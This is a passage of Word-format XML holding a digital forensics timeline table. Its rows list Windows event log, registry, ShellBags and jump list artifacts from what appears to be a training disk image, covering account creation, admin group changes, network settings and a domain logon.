              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-004</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:41:16.821390</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4720 | Microsoft-Windows-Security-Auditing | A new account was created | Target: MINWINPC\WDAGUtilityAccount (S-1-5-21-41211245-796119838-3940169921-504)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#37494</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05:41:33.459149</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>System 6005 | EventLog | The Event log service was started | Computer: WIN-2IH1TBB9I4Q</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39910</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:46:38.921356</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Control\ComputerName\ComputerName</w:t>
              <w:br/>
              <w:t>System Info | System Info (Current) | ComputerName=DESKTOP-SDN1RPT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#1872</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:46:39.866681</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4720 | Microsoft-Windows-Security-Auditing | A new account was created | Target: DESKTOP-SDN1RPT\defaultuser0 (S-1-5-21-41211245-796119838-3940169921-1000)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#37621</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05:49:07.890379</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: accounts (SAM)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Account created</w:t>
              <w:br/>
              <w:t>Admin RID=1001 logons=6 groups=Administrators</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_UserAccounts.csv#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001, F-005, F-021</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:49:07.897871</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4720 | Microsoft-Windows-Security-Auditing | A new account was created | Target: DESKTOP-SDN1RPT\Admin (S-1-5-21-41211245-796119838-3940169921-1001)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#37812</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05:49:08.012488</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Builtin\Administrators (S-1-5-32-544) | SubjectLogonId: 0x3E7 | MemberName: - | MemberSid: S-1-5-21-41211245-796119838-3940169921-1001 | PrivilegeList: -</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#37822</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05:49:10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShellBags</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Folder: created (recorded)</w:t>
              <w:br/>
              <w:t>Desktop\This PC\C:\Users\Admin\Documents</w:t>
              <w:br/>
              <w:t>Directory Documents MFT=84010 [explored]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sbecmd/Administrator_UsrClass.csv#19</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-026, T-022</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 06:41:02.861987</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Control\TimeZoneInformation</w:t>
              <w:br/>
              <w:t>System Info | System Time Zone Information | TimeZoneKeyName=Pacific Standard Time | Pacific Standard Time</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#1858</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 06:41:02.861987</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Control\TimeZoneInformation</w:t>
              <w:br/>
              <w:t>System Info | System Time Zone Information | ActiveTimeBias=420 | 420</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#1859</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:40:22.975260</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Services\Tcpip\Parameters\Interfaces\{d2609205-c6f4-4151-b4e7-e2ac9452bcac}</w:t>
              <w:br/>
              <w:t>System Info | Network Configuration (IPv4) | IPAddress=10.42.85.115</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#1890</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:40:22.975260</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Services\Tcpip\Parameters\Interfaces\{d2609205-c6f4-4151-b4e7-e2ac9452bcac}</w:t>
              <w:br/>
              <w:t>System Info | Network Configuration (IPv4) | NameServer=10.42.85.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#1896</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:40:37.260392</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4726 | Microsoft-Windows-Security-Auditing | A user account was deleted | Target: DESKTOP-SDN1RPT\defaultuser0 (S-1-5-21-41211245-796119838-3940169921-1000) | SubjectLogonId: 0x1A6AA</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38364</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:42:15.957439</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4648 | Microsoft-Windows-Security-Auditing | A logon was attempted using explicit credentials | Target: C137.LOCAL\Administrator | TargetServerName: CITADEL-DC01.C137.local | PID: 0x4 | TargetInfo: cifs/CITADEL-DC01.C137.local | 10.42.85.10:445</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38428</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21:42:16.235521</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Builtin\Administrators (S-1-5-32-544) | SubjectLogonId: 0x1A6AA | MemberName: - | MemberSid: S-1-5-21-2232410529-1445159330-2725690660-512 | PrivilegeList: -</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38431</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21:42:27.001485</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\system32\SystemSettingsAdminFlows.exe (DESKTOP-SDN1RPT)</w:t>
              <w:br/>
              <w:t>System 1074 | User32 | A user initiated a system restart | Hostname: DESKTOP-SDN1RPT | Reason: Other (Unplanned) | Type: restart | Code: 0x0 | C:\Windows\system32\SystemSettingsAdminFlows.exe (DESKTOP-SDN1RPT)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40266</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001, T-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:42:35.500078</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump Lists (automatic)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump List: entry created (≈ first opened)</w:t>
              <w:br/>
              <w:t>C:\Users\mortysmith\Documents\My Social Security Number.txt</w:t>
              <w:br/>
              <w:t>Notepad 64-bit interactions=1 machine=desktop-sdn1rpt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>jlecmd/20261025191825_AutomaticDestinations.csv#15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\9b9cdc69c1c24e2b.automaticDestinations-ms</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-013</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:42:39.868133</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
